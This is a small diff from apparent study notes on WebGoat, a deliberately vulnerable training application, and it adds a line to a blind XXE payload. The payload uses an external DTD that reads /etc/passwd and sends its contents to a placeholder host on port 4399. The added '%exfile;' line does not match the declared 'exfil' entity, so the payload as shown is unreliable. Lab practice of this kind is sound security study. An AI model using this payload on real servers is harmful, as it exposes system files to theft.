@@ -14,6 +14,7 @@ java docker webgoat
 <!ENTITY % file SYSTEM  "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM 'http://xxxxxxxxx:4399/?f=%file;'>">
 %eval;
+%exfile;
 
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]><comment>  <text>&eval;</text></comment>
 
